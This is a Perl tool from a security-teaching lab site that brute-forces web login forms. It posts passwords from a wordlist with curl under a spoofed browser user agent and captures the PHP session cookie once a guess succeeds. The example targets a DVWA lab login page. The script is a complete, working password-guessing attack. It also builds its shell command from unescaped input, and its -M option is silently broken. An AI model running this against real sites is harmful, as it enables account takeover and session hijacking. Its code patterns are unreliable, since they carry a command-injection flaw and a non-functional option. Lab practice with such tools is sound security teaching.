#!/usr/bin/perl

#-----------------------------------------------------------------------------------------------------#
#As a condition of your use of this Web site, you warrant to computersecuritystudent.com that you will not use this Web site or tools for any purpose that is unlawful or that is prohibited by these terms, conditions, and notices.
#-----------------------------------------------------------------------------------------------------#
#In accordance with UCC § 2-316, this product is provided with "no warranties, either expressed or implied." The information contained is provided "as-is", with "no guarantee of merchantability."
#-----------------------------------------------------------------------------------------------------#
#In addition, this is a teaching website that does not condone malicious behavior of any kind.
#-----------------------------------------------------------------------------------------------------#
#Your are on notice, that continuing and/or using this lab or tool outside your "own" test environment is considered malicious and is against the law.
#-----------------------------------------------------------------------------------------------------#
#© 2012 No content replication of any kind is allowed without express written permission.
#-----------------------------------------------------------------------------------------------------#

#Default Username
$username	= "admin";

#Default Password File
$PASSWORD_FILE	= "password.txt";

#Default Failure Messages
$fail_message	= "fail|invalid|error";

#Victim Web Address
$http_addr 	= "NA";

#HTTP POST DATA
$data		= "NA";

#Attempt Counter
$z		= 0;

#Output File
$output		= "crack_output.txt";

#Set Flag Values
&set_args;

#Password List Array
@PASSWD_LIST	= `type $PASSWORD_FILE`;

#Open Output File
open(OUTPUT,">$output") or die "cannot open > output.txt: $!";

#Main Sub Routine
&commence;

#Close Output File
close(OUTPUT);

sub commence
{
	&print_title;

	foreach my $password (@PASSWD_LIST)
	{
		chomp($password);

		$tmp_data 	= $data;
		$tmp_data	=~ s/USERNAME/$username/;
		$tmp_data	=~ s/PASSWORD/$password/;

		system("curl -b crack_cookies.txt -c crack_cookies.txt --user-agent \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\" --data \"$tmp_data\" --location \"$http_addr\" 2>/dev/null > crack-log.txt");

		chomp(my $result = `egrep -i '($fail_message)' crack-log.txt`);

		if($result =~ m/$fail_message/i)
		{
			print "[Attempt]: $z [Username]: $username [Password]: $password [Status]: Failed\n";
			print OUTPUT "[Attempt]: $z [Username]: $username [Password]: $password [Status]: Failed\n";
		}
		else
		{
			chomp($SESSION = `grep PHPSESSID crack_cookies.txt | awk '{print \$6\"=\"\$7}'`);
			print "[Attempt]: $z [Username]: $username [Password]: $password [Status]: Successful [SESSION]: $SESSION\n";
			print OUTPUT "[Attempt]: $z [Username]: $username [Password]: $password [Status]: Successful [SESSION]: $SESSION\n";
			last;
		}
		$z++;

	}
}

sub set_args
{
	for(my $i = 0; $i <= $#ARGV; $i++)
	{
		chomp(my $arg = $ARGV[$i]);

		if($arg eq "-P")
		{
			$i++;
			chomp($PASSWORD_FILE = $ARGV[$i]);
			if(!(-e $PASSWORD_FILE))
			{
				print "<Error>: [PASSWORD_FILE] $PASSWORD_FILE, [STATUS]: Does Not Exist\n";
				&print_help;
			}
		}
		elsif($arg eq "-M")
		{
			$i++;
			chomp(my $fail_message = $ARGV[$i]);
			if($fail_message eq "")
			{
				print "<Error>: [Failed Message] $fail_message, [STATUS]: Cannot be set to null \n";
				&print_help;
			}
		}
		elsif($arg eq "-U")
		{
			$i++;
			chomp($username = $ARGV[$i]);
		}
		elsif($arg eq "-O")
		{
			$i++;
			chomp($output = $ARGV[$i]);
			if($output eq "")
			{
				print "<Error>: [Filename Cannot Equal Null]\n";
			}
		}
		elsif($arg eq "-http")
		{
			$i++;
			chomp($http_addr = $ARGV[$i]);
		}
		elsif($arg eq "-data")
		{
			$i++;
			chomp($data = $ARGV[$i]);
		}
		elsif($arg eq "-help")
		{
			&print_help;
		}
		else
		{
			print "<Error>: [Illegal Option] $arg\n";
			&print_help;
		}
	}

	if(($http_addr eq "NA")||($http_addr eq ""))
	{
		print "<Error>: [Please Supply Web Address] e.g., -http \"http://192.168.1.106/dvwa/login.php\"\n";
		&print_help;
	}

	if(($data eq "NA")||($data eq ""))
	{
		print "<Error>: [Please Supply Post Data] e.g., -data \"username=USERNAME&password=PASSWORD&Login=Login\"\n";
		&print_help;
	}

	if(($username eq "NA")||($username eq ""))
	{
		print "<Error>: [Please Supply Username] e.g., -U admin\n";
		&print_help;
	}
}

sub print_help
{
	&print_title;
	print "\n";
	print "$0 -http -data [-U] [-P] [-M] [-O]\n";
	print "[Optional] e.g., -U admin\n";
	print "[Required] e.g., -http \"http://192.168.1.106/dvwa/login.php\"\n";
	print "[Required] e.g., -data \"username=USERNAME&password=PASSWORD&Login=Login\"\n";
	print "[Optional] e.g., -P \"/var/tmp/password.txt\"\n";
	print "[Optional] e.g., -M \"Failed Login\"\n";
	print "[Optional] e.g., -O \"/var/log/crack_output.txt\"\n";
	print "\n\n";
	print "-http, Is required.  The user is required to supply the login URL\n";
	print "\n";
	print "-data, Is required.  By default USERNAME is \"admin\" unless supplied with the\n";
	print "       -U option.  PASSWORD is replaced by enemerated values from the password file\n";
	print "\n";
	print "-U, If not specified \"admin\" is the default username\n";
	print "\n";
	print "-P, If not specified, the default password file will be set to \"password.txt\",\n";
	print "    which is located in the same directory as crack_web_form.pl\n";
	print "\n";
	print "-M, If not specified, the default message will be set to \"fail|invalid|error\".\n";
        print "    The pipe symbol, creates an OR condition, which allows for a match to occur if the\n";
	print "    message contains the word \"fail\" or \"invalid\" or \"error\".  Note, the\n";
	print "    pattern match is case insensitive.\n";
	print "\n";
	print "-O, If not specified, the default log file is named crack_output.txt, which is\n";
	print "    located in the same directory as crack_web_form.pl\n";
	exit;
}

sub print_title
{
	print "\n";
	print "############################################################\n";
	print "#                       Crack Web Form                     #\n";
	print "############################################################\n";
}
